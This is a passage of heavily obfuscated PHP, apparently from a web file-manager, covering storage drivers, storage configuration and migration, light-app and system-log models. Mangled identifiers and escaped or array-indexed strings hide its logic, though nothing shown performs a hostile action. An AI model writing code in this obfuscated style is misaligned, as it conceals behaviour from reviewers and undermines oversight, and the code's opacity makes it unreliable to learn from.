$˜¨¦ÈÅÖ = '') { $„åÁÊõ =& $_SERVER[ïÃ°£«Ê]; if ($this->isFileOutServer()) { return $this->fileOutServer($­¾âëíî, $áÄ˜ã¡Ğ, $İë«œ·Õ, $˜¨¦ÈÅÖ); } if (!$İë«œ·Õ) { $İë«œ·Õ = $this->pathThis($­¾âëíî); } $şÁÑòøÑ = $áÄ˜ã¡Ğ ? $„åÁÊõ[1748] . rawurlencode($İë«œ·Õ) : $„åÁÊõ[12]; $©­¨İãÄ = $this->link($­¾âëíî, $şÁÑòøÑ); $this->fileOutLink($©­¨İãÄ); } public function fileOutServer($ŒĞ‹øö–, $ïûçÒ™’ = false, $·Áñ–“Š = false, $ŠÄ”¡øØ = '') { parent::fileOut($ŒĞ‹øö–, $ïûçÒ™’, $·Áñ–“Š, $ŠÄ”¡øØ); } public function fileOutImage($µ€÷¡ı, $ÜÑã¥ˆò = 250) { if ($this->size($µ€÷¡ı) > 1024 * 1024 * 20) { return $this->fileOutImageServer($µ€÷¡ı, $ÜÑã¥ˆò); } $öÇı¡‰» = $this->link($µ€÷¡ı, $_SERVER[ïÃ°£«Ê][1749] . $ÜÑã¥ˆò); $this->fileOutLink($öÇı¡‰»); } public function fileOutImageServer($ãŞâÍ±Œ, $Æõ°ÃÕŒ = 250) { parent::fileOutImage($ãŞâÍ±Œ, $Æõ°ÃÕŒ); } public function hashMd5($Úøë¾ğ) { $¬¨æßœ =& $_SERVER[ïÃ°£«Ê]; $‰¦‘™Ù = $this->objectMeta($Úøë¾ğ); return isset($‰¦‘™Ù[$¬¨æßœ[245]]) ? $‰¦‘™Ù[$¬¨æßœ[245]] : !1; $ı¡ı‹è = $this->link($Úøë¾ğ, $¬¨æßœ[1750]); } public function size($±õÍĞÄÖ) { $ßÄªš”† = $this->objectMeta($±õÍĞÄÖ); return $ßÄªš”† ? $ßÄªš”†[$_SERVER[ïÃ°£«Ê][79]] : 0; } public function info($áà²öŒ¼) { if ($this->isFolder($áà²öŒ¼)) { return $this->folderInfo($áà²öŒ¼); } else { if ($this->isFile($áà²öŒ¼)) { return $this->fileInfo($áà²öŒ¼); } } return !1; } public function exist($÷ëÃğßØ) { return $this->isFile($÷ëÃğßØ) || $this->isFolder($÷ëÃğßØ); } public function isFile($œˆÇ‹ì) { return !$this->isFolder($œˆÇ‹ì) && $this->objectMeta($œˆÇ‹ì); } public function isFolder($¹ÌÍëóó) { return $this->cacheMethod($_SERVER[ïÃ°£«Ê][177], $¹ÌÍëóó); } protected function objectMeta($½ºŒ»ãà) { return $this->cacheMethod($_SERVER[ïÃ°£«Ê][179], $½ºŒ»ãà); } protected function _objectMeta($Ô‰üŞ­õ) { $Ş”Æóùğ =& $_SERVER[ïÃ°£«Ê]; list($†ö£„, $½˜ÌĞ¿) = $this->bucketManager->stat($this->bucket, $Ô‰üŞ­õ); if ($†ö£„) { $†ö£„[$Ş”Æóùğ[79]] = intval($†ö£„[$Ş”Æóùğ[1738]]); } return $†ö£„; } protected function _isFolder($èä•‘¿­) { $ç€ƒá½Ÿ =& $_SERVER[ïÃ°£«Ê]; if ($èä•‘¿­ == $ç€ƒá½Ÿ[12] || $èä•‘¿­ == $ç€ƒá½Ÿ[8]) { return !0; } list($àĞ…ºñö, $õ«‰ú¥Â) = $this->bucketManager->listFiles($this->bucket, trim($èä•‘¿­, $ç€ƒá½Ÿ[8]) . $ç€ƒá½Ÿ[8], $ç€ƒá½Ÿ[12], 1, $ç€ƒá½Ÿ[8]); return !empty($àĞ…ºñö[$ç€ƒá½Ÿ[1741]]) || !empty($àĞ…ºñö[$ç€ƒá½Ÿ[1742]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($›¨Í´¾Œ, $Ü„¯¼‡æ = 0) { parent::__construct(); $this->source = $›¨Í´¾Œ; $this->sourceSize = $Ü„¯¼‡æ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($¸“°áÂ = false) { return $this->sourceSize; } public function getContent($ÎˆÚ÷Û“ = false) { return $this->fileSubstr($ÎˆÚ÷Û“, 0, $this->sourceSize); } public function fileSubstr($îë±±ë¹ = false, $åª‡§ã = 0, $Ê”—‰Õá = 0) { if (!$Ê”—‰Õá) { $Ê”—‰Õá = $this->sourceSize; } $‚Ê³ˆë‘ = $this->sourceSize - $åª‡§ã; if ($Ê”—‰Õá >= $‚Ê³ˆë‘) { $Ê”—‰Õá = $‚Ê³ˆë‘; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $åª‡§ã, $Ê”—‰Õá); } if ($this->sourceType == self::TYPE_FILE) { if ($Ê”—‰Õá <= 0) { return $_SERVER[ïÃ°£«Ê][12]; } $ÃÀ§ĞÅô = ftell($this->source); fseek_64($this->source, $ÃÀ§ĞÅô + $åª‡§ã); $Ê¼«ÆîÉ = @fread($this->source, $Ê”—‰Õá); fseek_64($this->source, $ÃÀ§ĞÅô); return $Ê¼«ÆîÉ; } } public function hashMd5($Ã¼äå²å = false) { return md5($this->getContent()); } public static function hash($Ø»ñÚíß, $ÕÅ±¤² = 0) { $ÆÙ©‰º­ = new PathDriverStream($Ø»ñÚíß, $ÕÅ±¤²); return $ÆÙ©‰º­->hashSimple($Ø»ñÚíß); } public static function md5($ÊÛæ®¨, $©³×ÚÏ¼ = 0) { $ÜÍªÉ» = new PathDriverStream($ÊÛæ®¨, $©³×ÚÏ¼); return $ÜÍªÉ»->hashMd5($ÊÛæ®¨); } } goto CÕÖîÊÍ²²; Eòô‘½­À“: class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\56\x73\x74\x6f\x72\x61\x67\145\114\151\163\x74"; public $field = array("\x6e\141\x6d\x65", "\x73\151\172\x65\115\x61\170", "\x73\x79\x73\164\145\x6d", "\x64\x65\146\x61\165\154\164", "\x64\x72\x69\x76\145\x72", "\143\x6f\x6e\x66\x69\x67"); public function listData($´³ÎÇ®¿ = false, $‹‘‹Ù’Ÿ = "\x6d\x6f\x64\x69\146\x79\124\x69\155\x65", $ôƒ³‰˜ì = false) { $Çìà¨ìÃ =& $_SERVER[ïÃ°£«Ê]; $©Š‹˜§œ = parent::listData($´³ÎÇ®¿, $‹‘‹Ù’Ÿ, $ôƒ³‰˜ì); if ($´³ÎÇ®¿) { return $©Š‹˜§œ; } $ûÇÕ—‘Ç = array(); if ($GLOBALS[$Çìà¨ìÃ[2516]]) { $ûÇÕ—‘Ç = $this->ioSizeUseGet(array_to_keyvalue($©Š‹˜§œ, $Çìà¨ìÃ[12], $Çìà¨ìÃ[487])); } foreach ($©Š‹˜§œ as $Í×šüÌ¥ => $÷åå½¦) { unset($©Š‹˜§œ[$Í×šüÌ¥][$Çìà¨ìÃ[6]]); $©Š‹˜§œ[$Í×šüÌ¥][$Çìà¨ìÃ[2173]] = isset($ûÇÕ—‘Ç[$÷åå½¦[$Çìà¨ìÃ[487]]]) ? $ûÇÕ—‘Ç[$÷åå½¦[$Çìà¨ìÃ[487]]] : 0; } return $©Š‹˜§œ; } public function ioSizeUseGet($³Ôî˜ò) { $ïùŠ“ç¥ =& $_SERVER[ïÃ°£«Ê]; if (!$³Ôî˜ò) { return array(); } $„©¹¼ËÊ = $ïùŠ“ç¥[2517] . implode($ïùŠ“ç¥[50], $³Ôî˜ò); $±£‘¯¹¢ = Cache::get($„©¹¼ËÊ); if ($±£‘¯¹¢) { return $±£‘¯¹¢; } $ÓƒãŠªâ = array($ïùŠ“ç¥[927] => $ïùŠ“ç¥[487], $ïùŠ“ç¥[2518] => $ïùŠ“ç¥[79]); $ÉÛ¸Öò£ = array($ïùŠ“ç¥[927] => array($ïùŠ“ç¥[7], $³Ôî˜ò)); $±£‘¯¹¢ = Model($ïùŠ“ç¥[917])->field($ÓƒãŠªâ)->where($ÉÛ¸Öò£)->group($ïùŠ“ç¥[927])->select(); $±£‘¯¹¢ = array_to_keyvalue($±£‘¯¹¢, $ïùŠ“ç¥[487], $ïùŠ“ç¥[79]); Cache::set($„©¹¼ËÊ, $±£‘¯¹¢, 600); return $±£‘¯¹¢; } public function getConfig($„È¢•†©) { $ÏŒ„òÀ = parent::listData($„È¢•†©); $ŠÆ±Ğùª = _get($ÏŒ„òÀ, $_SERVER[ïÃ°£«Ê][6], array()); if ($ŠÆ±Ğùª && !is_array($ŠÆ±Ğùª)) { $ŠÆ±Ğùª = json_decode($ŠÆ±Ğùª, !0); } return $ŠÆ±Ğùª; } public function update($¢Ûş‚Ú, $œúşÄƒ) { $ë¢œƒ¼ó =& $_SERVER[ïÃ°£«Ê]; $Òìíìáâ = $œúşÄƒ[$ë¢œƒ¼ó[32]]; $úï†ëÎ = array_to_keyvalue(parent::listData(), $ë¢œƒ¼ó[32]); if (isset($úï†ëÎ[$Òìíìáâ]) && $úï†ëÎ[$Òìíìáâ][$ë¢œƒ¼ó[487]] != $¢Ûş‚Ú) { return !1; } $this->checkPwd($¢Ûş‚Ú, $œúşÄƒ); if (isset($œúşÄƒ[$ë¢œƒ¼ó[2519]]) && $œúşÄƒ[$ë¢œƒ¼ó[2519]] == $ë¢œƒ¼ó[91]) { $this->checkConfig($œúşÄƒ); } unset($œúşÄƒ[$ë¢œƒ¼ó[2519]]); $ÜÒŸã´Ô = parent::update($¢Ûş‚Ú, $œúşÄƒ); if ($ÜÒŸã´Ô && $œúşÄƒ[$ë¢œƒ¼ó[37]]) { foreach ($úï†ëÎ as $ÌéÂÆÜî) { if ($ÌéÂÆÜî[$ë¢œƒ¼ó[37]] && $ÌéÂÆÜî[$ë¢œƒ¼ó[487]] != $¢Ûş‚Ú) { parent::update($ÌéÂÆÜî[$ë¢œƒ¼ó[487]], array($ë¢œƒ¼ó[37] => 0)); } } $this->updateBackup($¢Ûş‚Ú, $úï†ëÎ); } return $ÜÒŸã´Ô; } public function add($³¸üìŒ÷) { $ªıÌÂàÌ =& $_SERVER[ïÃ°£«Ê]; $„ó¡‘œ = array_to_keyvalue(parent::listData(), $ªıÌÂàÌ[32]); if (isset($„ó¡‘œ[$³¸üìŒ÷[$ªıÌÂàÌ[32]]])) { return !1; } $this->checkConfig($³¸üìŒ÷); $İÜí‘§ã = parent::insert($³¸üìŒ÷); if ($İÜí‘§ã && $³¸üìŒ÷[$ªıÌÂàÌ[37]]) { foreach ($„ó¡‘œ as $‚ßÈİñâ) { if ($‚ßÈİñâ[$ªıÌÂàÌ[37]]) { parent::update($‚ßÈİñâ[$ªıÌÂàÌ[487]], array($ªıÌÂàÌ[37] => 0)); } } $this->updateBackup($İÜí‘§ã, $„ó¡‘œ); } return $İÜí‘§ã; } public function updateBackup($¯‡Í‡›», $ôò³¾Ä—) { $®çÄåÅÔ =& $_SERVER[ïÃ°£«Ê]; $È—õ´“ = Model($®çÄåÅÔ[874])->get($®çÄåÅÔ[880]); $È—õ´“ = json_decode($È—õ´“, !0); if (!$È—õ´“) { return; } if ($È—õ´“[$®çÄåÅÔ[1950]] != $®çÄåÅÔ[91]) { return; } $ĞÒ‚æÏ® = $È—õ´“[$®çÄåÅÔ[853]]; if ($È—õ´“[$®çÄåÅÔ[168]] != $®çÄåÅÔ[1310]) { if ($ĞÒ‚æÏ® != $¯‡Í‡›») { return; } $È—õ´“[$®çÄåÅÔ[168]] = $®çÄåÅÔ[1310]; } else { if ($ĞÒ‚æÏ® == $¯‡Í‡›») { return; } $È—õ´“[$®çÄåÅÔ[853]] = $¯‡Í‡›»; } Model($®çÄåÅÔ[874])->set(array($®çÄåÅÔ[880] => $È—õ´“)); } public function checkPwd($û¥÷Œä, &$ĞÊÏİÓ¤) { $€‘¼œ×À =& $_SERVER[ïÃ°£«Ê]; if (empty($ĞÊÏİÓ¤[$€‘¼œ×À[6]])) { return; } $«Àù‘ = $ĞÊÏİÓ¤[$€‘¼œ×À[6]]; if (!is_array($«Àù‘)) { $«Àù‘ = json_decode($«Àù‘, !0); } $ šÎİ ˆ = $€‘¼œ×À[12]; $„•¦˜ñ® = array($€‘¼œ×À[1643], $€‘¼œ×À[2520], $€‘¼œ×À[1051]); foreach ($„•¦˜ñ® as $…ôöô’») { if (isset($«Àù‘[$…ôöô’»])) { $ šÎİ ˆ = $…ôöô’»; break; } } if (!$ šÎİ ˆ) { return; } $ŞŒšàƒá = $this->getConfig($û¥÷Œä); $…íÍÊì³ = $ŞŒšàƒá[$ šÎİ ˆ]; $¯ÜÈ§Ã› = $«Àù‘[$ šÎİ ˆ]; if ($¯ÜÈ§Ã› == str_repeat($€‘¼œ×À[220], strlen($…íÍÊì³))) { $«Àù‘[$ šÎİ ˆ] = $…íÍÊì³; $ĞÊÏİÓ¤[$€‘¼œ×À[6]] = json_encode($«Àù‘); } else { if ($¯ÜÈ§Ã› != $…íÍÊì³) { $ĞÊÏİÓ¤[$€‘¼œ×À[2519]] = $€‘¼œ×À[91]; } } } public function checkConfig(&$¦Ş„´â†, $™÷ö´æı = false) { $Ú°¿¤¥ =& $_SERVER[ïÃ°£«Ê]; $ÏşÜíÉ× = strtolower($¦Ş„´â†[$Ú°¿¤¥[96]]); $Èó¯üÒ = $¦Ş„´â†[$Ú°¿¤¥[6]]; if (!is_array($Èó¯üÒ)) { $Èó¯üÒ = json_decode($Èó¯üÒ, !0); } foreach ($Èó¯üÒ as $óªÛÄ‰ => $œÍıœ«Ø) { if (is_string($œÍıœ«Ø)) { $Èó¯üÒ[$óªÛÄ‰] = trim($œÍıœ«Ø); } } $Èó¯üÒ[$Ú°¿¤¥[2521]] = rand_string(6); $¹ƒªìŸ® = $GLOBALS[$Ú°¿¤¥[6]][$Ú°¿¤¥[92]][$Ú°¿¤¥[935]]; $¾ÄÃÚ¿´ = isset($¹ƒªìŸ®[$ÏşÜíÉ×]) ? $¹ƒªìŸ®[$ÏşÜíÉ×] : ucfirst($ÏşÜíÉ×); $éË¿¼â¶ = $Ú°¿¤¥[77] . $¾ÄÃÚ¿´; if (!$¾ÄÃÚ¿´ || !class_exists($éË¿¼â¶)) { if ($™÷ö´æı) { return LNG($Ú°¿¤¥[2522]); } write_log(array($Ú°¿¤¥[2523], $¦Ş„´â†, get_caller_info()), $Ú°¿¤¥[213]); show_json(LNG($Ú°¿¤¥[2522]), !1, $¦Ş„´â†); } $¯µ²²Šš = new $éË¿¼â¶($Èó¯üÒ); $Ó³µ”Ùş = rtrim($Èó¯üÒ[$Ú°¿¤¥[1371]], $Ú°¿¤¥[8]) . $Ú°¿¤¥[8]; if (in_array($ÏşÜíÉ×, $¯µ²²Šš->objectDriver)) { try { if (!$¯µ²²Šš->isBucketCors() && !$¯µ²²Šš->setBucketCors()) { $‹½‰Á¿è = LNG($Ú°¿¤¥[2524]); $‹½‰Á¿è .= $Ú°¿¤¥[2525] . LNG($Ú°¿¤¥[2526]); } } catch (Exception $µÖµ£²) { $‹½‰Á¿è = $µÖµ£²->getMessage(); } if (isset($‹½‰Á¿è)) { return $this->_parseError($‹½‰Á¿è, $ÏşÜíÉ×, $™÷ö´æı); } if ($ÏşÜíÉ× == $Ú°¿¤¥[68]) { $‘¿ÁÂ÷ì = $¯µ²²Šš->getBktRegion(); if ($‘¿ÁÂ÷ì != $Èó¯üÒ[$Ú°¿¤¥[2527]]) { $Èó¯üÒ[$Ú°¿¤¥[2527]] = $‘¿ÁÂ÷ì; $¯µ²²Šš->setRegion($‘¿ÁÂ÷ì); } } } else { if ($ÏşÜíÉ× == $Ú°¿¤¥[2528]) { if ($¯µ²²Šš->ftpPath) { $şÍûñÇÀ = trim($Ó³µ”Ùş, $Ú°¿¤¥[8]); if (stripos($şÍûñÇÀ, trim($¯µ²²Šš->ftpPath, $Ú°¿¤¥[8])) !== 0) { $Ó³µ”Ùş = $¯µ²²Šš->ftpPath . $Ú°¿¤¥[8] . ($şÍûñÇÀ ? $şÍûñÇÀ . $Ú°¿¤¥[8] : $Ú°¿¤¥[12]); } } } } $Öû¿ó÷œ = $¯µ²²Šš->getPath($Ó³µ”Ùş . $Ú°¿¤¥[1375]); try { if ($ÏşÜíÉ× == $Ú°¿¤¥[106]) { $¯µ²²Šš->mkdir($Ó³µ”Ùş, REPEAT_SKIP); } $í¶Áêô = $¯µ²²Šš->mkfile($Öû¿ó÷œ, $Ú°¿¤¥[12], REPEAT_REPLACE); if (!$í¶Áêô) { $‹½‰Á¿è = LNG($Ú°¿¤¥[2524]); } } catch (Exception $µÖµ£²) { $‹½‰Á¿è = $µÖµ£²->getMessage(); } if (isset($‹½‰Á¿è)) { return $this->_parseError($‹½‰Á¿è, $ÏşÜíÉ×, $™÷ö´æı); } $Èó¯üÒ[$Ú°¿¤¥[1371]] = $Ó³µ”Ùş; $¦Ş„´â†[$Ú°¿¤¥[6]] = json_encode($Èó¯üÒ); $¦Ş„´â†[$Ú°¿¤¥[96]] = $¾ÄÃÚ¿´; return !0; } private function _parseError($ˆ¨²Ù, $Ş‘ãÛ³, $Ãç³›ùá = false) { $¨İŞ‰œà =& $_SERVER[ïÃ°£«Ê]; if ($Ş‘ãÛ³ == $¨İŞ‰œà[68] && stripos($ˆ¨²Ù, $¨İŞ‰œà[2529])) { $ì«›šıÊ = explode($¨İŞ‰œà[10], $ˆ¨²Ù); $¡õ‰¯“ = isset($ì«›šıÊ[1]) ? $ì«›šıÊ[1] : $¨İŞ‰œà[12]; $ÖşûŸĞ­ = array($¨İŞ‰œà[2530] => LNG($¨İŞ‰œà[2531]), $¨İŞ‰œà[2532] => LNG($¨İŞ‰œà[2533])); if (isset($ÖşûŸĞ­[$¡õ‰¯“])) { $ˆ¨²Ù = $ÖşûŸĞ­[$¡õ‰¯“]; } } if (stripos($ˆ¨²Ù, $¨İŞ‰œà[2534]) === 0) { $ôšµş¸· = strpos($ˆ¨²Ù, $¨İŞ‰œà[175]); if ($ôšµş¸· === !1) { $ôšµş¸· = strpos($ˆ¨²Ù, $¨İŞ‰œà[4]); } if ($ôšµş¸· !== !1) { $ˆ¨²Ù = substr($ˆ¨²Ù, $ôšµş¸· + 1); } } $ˆ¨²Ù = LNG($¨İŞ‰œà[1378]) . $ˆ¨²Ù; if ($Ãç³›ùá) { return $ˆ¨²Ù; } show_json($ˆ¨²Ù, !1); } public function driverListSystem() { $ğ…»´í§ =& $_SERVER[ïÃ°£«Ê]; $–†â–ø = parent::listData(); $ª¶„ó©ø = array(); foreach ($–†â–ø as $èŞúß ë) { unset($èŞúß ë[$ğ…»´í§[231]], $èŞúß ë[$ğ…»´í§[88]]); if (!is_array($èŞúß ë[$ğ…»´í§[6]])) { $èŞúß ë[$ğ…»´í§[6]] = json_decode($èŞúß ë[$ğ…»´í§[6]], !0); } $ª¶„ó©ø[] = $èŞúß ë; } return $ª¶„ó©ø; } public function defaultDriver() { $°£Œòš =& $_SERVER[ïÃ°£«Ê]; $ÅÉÆÖİÜ = parent::listData(); $©øò§» = array_filter_by_field($ÅÉÆÖİÜ, $°£Œòš[37], 1); $©øò§» = $©øò§»[0]; if (!$©øò§») { return array(); } if (!is_array($©øò§»[$°£Œòš[6]])) { $©øò§»[$°£Œòš[6]] = json_decode($©øò§»[$°£Œòš[6]], !0); } return $©øò§»; } public function driverInfo($¶“ïç×â) { $¬É©Û‰ü =& $_SERVER[ïÃ°£«Ê]; $ºø«ö¼Ñ = array_to_keyvalue(parent::listData(), $¬É©Û‰ü[487]); if (!isset($ºø«ö¼Ñ[$¶“ïç×â])) { return !1; } $»Öé’Ô = $ºø«ö¼Ñ[$¶“ïç×â]; if (!is_array($»Öé’Ô[$¬É©Û‰ü[6]])) { $»Öé’Ô[$¬É©Û‰ü[6]] = json_decode($»Öé’Ô[$¬É©Û‰ü[6]], !0); } return $»Öé’Ô; } public function remove($×æÏ¾ÅÅ) { $this->removeShareItems($×æÏ¾ÅÅ); return parent::remove($×æÏ¾ÅÅ); } public function removeWithFile($¼«æúÂ¼, $´åÍ‡‹ğ, $ê×Ê•Çó, $ˆÈ½øìú = false) { $Âşã“¢ =& $_SERVER[ïÃ°£«Ê]; ignore_timeout(); $‚¦Ğ™İà = array($Âşã“¢[927] => $¼«æúÂ¼); $·»Ú¤«± = Model($Âşã“¢[560]); if (isset($GLOBALS[$Âşã“¢[2535]])) { $ªµ†£¨˜ = $GLOBALS[$Âşã“¢[2535]]; } else { $ªµ†£¨˜ = $·»Ú¤«±->where($‚¦Ğ™İà)->field(array($Âşã“¢[950] => $Âşã“¢[951], $Âşã“¢[952] => $Âşã“¢[79]))->find(); } $Ëßø·ÆÜ = intval($ªµ†£¨˜[$Âşã“¢[951]]); $˜­ŠÒóş = intval($ªµ†£¨˜[$Âşã“¢[79]]); $÷Í™‹á = $´åÍ‡‹ğ . $Âşã“¢[2536] . $¼«æúÂ¼; $àú»‚½» = LNG($´åÍ‡‹ğ == $Âşã“¢[643] ? $Âşã“¢[2537] : $Âşã“¢[2538]); $Şï¿ÈÂ« = new TaskFileTransfer($÷Í™‹á, $Âşã“¢[213], $Ëßø·ÆÜ, $àú»‚½» . $Âşã“¢[476] . $ê×Ê•Çó[$Âşã“¢[32]] . $Âşã“¢[212] . $¼«æúÂ¼); $Şï¿ÈÂ«->task[$Âşã“¢[865]] = (double) $˜­ŠÒóş; $ö¬Ù¯´Æ = KodIO::defaultDriver(); $‹ÈÈ×æÚ = $ö¬Ù¯´Æ[$Âşã“¢[487]]; $‹İîíû = 1; $É¥“…ıë = 5000; $ÈüœÇŸ = $­Ûñö…ô = $Äñ½•Í = array(); $‹ĞÕ²­ª = $·»Ú¤«±->where($‚¦Ğ™İà)->field($Âşã“¢[2539])->selectPage($É¥“…ıë, $‹İîíû); $‹°Å¾Š = intval($‹ĞÕ²­ª[$Âşã“¢[443]][$Âşã“¢[445]]); while ($‹ĞÕ²­ª && $‹İîíû <= $‹°Å¾Š) { foreach ($‹ĞÕ²­ª[$Âşã“¢[446]] as $¨æ˜ûïŒ) { $³›òïö² = $¨æ˜ûïŒ[$Âşã“¢[557]]; if ($ˆÈ½øìú) { $­Ûñö…ô[] = $³›òïö²; continue; } $İ×¥´ø = $¨æ˜ûïŒ[$Âşã“¢[87]]; $†‚ÌË = rtrim(get_path_father($İ×¥´ø), $Âşã“¢[8]) . $Âşã“¢[8]; $Äñ½•Í[] = $†‚ÌË; $†‚ÌË = str_replace("\x7b\151\x6f\72{$¼«æúÂ¼}\x7d\57", "\173\151\157\x3a{$‹ÈÈ×æÚ}\x7d\57", $†‚ÌË); if (!IO::exist($İ×¥´ø) || !IO::isFile($İ×¥´ø)) { $ÈüœÇŸ[] = $³›òïö²; $Şï¿ÈÂ«->updateFileEnd($¨æ˜ûïŒ[$Âşã“¢[32]], $¨æ˜ûïŒ[$Âşã“¢[79]]); write_log($Âşã“¢[2540] . $İ×¥´ø, $Âşã“¢[2120]); continue; } $éßá“ı = IO::move($İ×¥´ø, $†‚ÌË, REPEAT_RENAME); if (!$éßá“ı) { $­Ûñö…ô[] = $³›òïö²; $Şï¿ÈÂ«->updateFileEnd($¨æ˜ûïŒ[$Âşã“¢[32]], $¨æ˜ûïŒ[$Âşã“¢[79]]); write_log($Âşã“¢[2541] . $İ×¥´ø, $Âşã“¢[2120]); continue; } $†€§£ = array($Âşã“¢[927] => $‹ÈÈ×æÚ, $Âşã“¢[87] => $éßá“ı); $·»Ú¤«±->where(array($Âşã“¢[557] => $³›òïö²))->save($†€§£); } $‹İîíû++; $‹ĞÕ²­ª = $·»Ú¤«±->where($‚¦Ğ™İà)->field($Âşã“¢[2539])->selectPage($É¥“…ıë, $‹İîíû); } $ó½¯æ½ß = $Şï¿ÈÂ«->task; if (!$ˆÈ½øìú) { Cache::set($÷Í™‹á, $ó½¯æ½ß); } $Şï¿ÈÂ«->end(); $ÈüœÇŸ = array_unique($ÈüœÇŸ); $­Ûñö…ô = array_unique($­Ûñö…ô); if (!$ˆÈ½øìú && ($ÈüœÇŸ || $­Ûñö…ô)) { $Ã°¥ù¦† = array(); if ($ÈüœÇŸ) { $Ã°¥ù¦†[] = sprintf(LNG($Âşã“¢[2542]), count($ÈüœÇŸ)); } if ($­Ûñö…ô) { $Ã°¥ù¦†[] = sprintf(LNG($Âşã“¢[2543]), count($­Ûñö…ô)); } $Ã°¥ù¦† = sprintf(LNG($Âşã“¢[2544]), implode($Âşã“¢[1588], $Ã°¥ù¦†)) . $Âşã“¢[2545] . date($Âşã“¢[2546]) . $Âşã“¢[2547]; if ($´åÍ‡‹ğ == $Âşã“¢[1336]) { $Ã°¥ù¦† .= $Âşã“¢[2548] . LNG($Âşã“¢[2549]); } else { $Ã°¥ù¦† = LNG($Âşã“¢[2550]) . $Âşã“¢[2551] . $Ã°¥ù¦†; } $ó½¯æ½ß[$Âşã“¢[1373]] = $Ã°¥ù¦†; Cache::set($÷Í™‹á, $ó½¯æ½ß); unset($ê×Ê•Çó[$Âşã“¢[6]]); $Ü‹†¶²Ü = array($Âşã“¢[487] => $¼«æúÂ¼, $Âşã“¢[2426] => $Âşã“¢[643], $Âşã“¢[32] => $ê×Ê•Çó[$Âşã“¢[32]], $Âşã“¢[96] => $ê×Ê•Çó[$Âşã“¢[96]]); Hook::trigger($Âşã“¢[1990], array($Âşã“¢[1394] => $Ü‹†¶²Ü, $Âşã“¢[1404] => !0)); show_json($Ã°¥ù¦†, !1, 100111); } if ($´åÍ‡‹ğ == $Âşã“¢[643]) { return !0; } if ($ÈüœÇŸ || $­Ûñö…ô) { $®ëâ‘Ò€ = array_merge($ÈüœÇŸ, $­Ûñö…ô); $®ëâ‘Ò€ = array_filter(array_unique($®ëâ‘Ò€)); $this->removeByFileID($®ëâ‘Ò€); } if ($Äñ½•Í) { $Äñ½•Í = array_filter(array_unique($Äñ½•Í)); foreach ($Äñ½•Í as $İ×¥´ø) { $ªµ†£¨˜ = IO::has($İ×¥´ø, !0); if (!$ªµ†£¨˜[$Âşã“¢[239]] && !$ªµ†£¨˜[$Âşã“¢[240]]) { IO::remove($İ×¥´ø); } } } return $this->remove($¼«æúÂ¼); } private function removeByFileID($éß¯ø”Ç = array()) { $…†Ãêà¿ =& $_SERVER[ïÃ°£«Ê]; if (empty($éß¯ø”Ç)) { return; } $ò‹ê´Ú¬ = array($…†Ãêà¿[557] => array($…†Ãêà¿[7], $éß¯ø”Ç)); $à‹»É…¾ = Model($…†Ãêà¿[1535])->where($ò‹ê´Ú¬)->field($…†Ãêà¿[2498])->select(); if (!$à‹»É…¾) { return Model($…†Ãêà¿[560])->remove($éß¯ø”Ç); } $à‹»É…¾ = array_to_keyvalue($à‹»É…¾, $…†Ãêà¿[191], $…†Ãêà¿[557]); foreach ($à‹»É…¾ as $Ããé¬› => $‰×„¾ Ù) { Model($…†Ãêà¿[934])->removeNow($Ããé¬›, !1); } $­æï‘·Ğ = array_diff($éß¯ø”Ç, array_unique(array_values($à‹»É…¾))); if ($­æï‘·Ğ) { return Model($…†Ãêà¿[560])->remove($­æï‘·Ğ); } } private function removeShareItems($¥ëû²¬³) { $üòÜú‚„ =& $_SERVER[ïÃ°£«Ê]; $¦éÖÍ“Ò = "\x7b\151\x6f\72{$¥ëû²¬³}\175\x2f"; $ï½Ü‰²‡ = array($üòÜú‚„[191] => 0, $üòÜú‚„[583] => array($üòÜú‚„[473], "{$¦éÖÍ“Ò}\x25")); $ŸÔÍû†£ = Model($üòÜú‚„[1564])->where($ï½Ü‰²‡)->field($üòÜú‚„[687])->select(); if (empty($ŸÔÍû†£)) { return; } $Ø»Êòàğ = array_to_keyvalue($ŸÔÍû†£, $üòÜú‚„[12], $üòÜú‚„[687]); Model($üòÜú‚„[686])->remove($Ø»Êòàğ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\x2e\x4c\x69\x67\150\x74\101\x70\160"; public $modelType = "\123\x79\163\164\145\155\117\160\x74\x69\157\156"; public $field = array("\x6e\141\x6d\x65", "\x67\162\x6f\165\160", "\144\x65\x73\143", "\143\157\x6e\164\x65\x6e\x74"); public function listData($ä÷úš¶º = false, $ş¢†ıõÆ = "\x6d\157\x64\x69\146\x79\x54\151\155\x65", $ØÚ°Í— = true) { return parent::listData($ä÷úš¶º, $ş¢†ıõÆ, $ØÚ°Í—); } public function remove($å®æÏ€à) { $—şâ¢­Ã = $this->findByName($å®æÏ€à); if (!$—şâ¢­Ã) { return !1; } return parent::remove($—şâ¢­Ã[$_SERVER[ïÃ°£«Ê][487]]); } public function add($¡áÍ÷Ì) { if ($this->findByName($¡áÍ÷Ì[$_SERVER[ïÃ°£«Ê][32]])) { return !1; } return parent::insert($¡áÍ÷Ì); } public function update($—Šì»Ù, $ã“Ô¦†±) { $‘è»ù€ =& $_SERVER[ïÃ°£«Ê]; $ó‹èÊ¹Å = $this->findByName($—Šì»Ù); $¬û—ÙÛ² = $this->findByName($ã“Ô¦†±[$‘è»ù€[32]]); if (!$ó‹èÊ¹Å || $¬û—ÙÛ² && $¬û—ÙÛ²[$‘è»ù€[487]] != $ó‹èÊ¹Å[$‘è»ù€[487]]) { return !1; } return parent::update($ó‹èÊ¹Å[$‘è»ù€[487]], $ã“Ô¦†±); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\164\x65\x6d\137\154\x6f\x67"; protected $dataAuto = array(array("\143\162\145\x61\x74\x65\124\x69\155\x65", "\164\x69\155\145", "\x69\156\163\x65\162\164", "\146\x75\x6e\x63\164\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $İº‰ä¯Ş =& $_SERVER[ïÃ°£«Ê]; return array($İº‰ä¯Ş[2552] => LNG($İº‰ä¯Ş[2553]), $İº‰ä¯Ş[2554] => LNG($İº‰ä¯Ş[2555]), $İº‰ä¯Ş[2131] => 